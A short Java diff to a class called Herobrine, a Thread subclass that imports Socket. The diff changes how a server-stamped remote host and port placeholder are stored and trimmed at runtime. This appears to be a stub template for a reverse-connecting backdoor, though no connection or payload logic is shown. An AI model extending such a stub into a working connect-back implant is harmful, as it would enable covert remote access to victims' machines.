@@ -4,9 +4,11 @@ import java.net.Socket;
 
 public class Herobrine extends Thread
 {
-    // values are stamped by the HTTP server
-    private static String remoteHost = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
-    private static int remotePort = Integer.parseInt("BBBBBBBB");
+    // values are stamped by the HTTP server, then trimmed at runtime
+    private static String remoteHost = "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
+        .replaceAll("@", "");
+    private static int remotePort = Integer.parseInt("########".replaceAll("#", ""));
+        
 
     public Herobrine()
     {
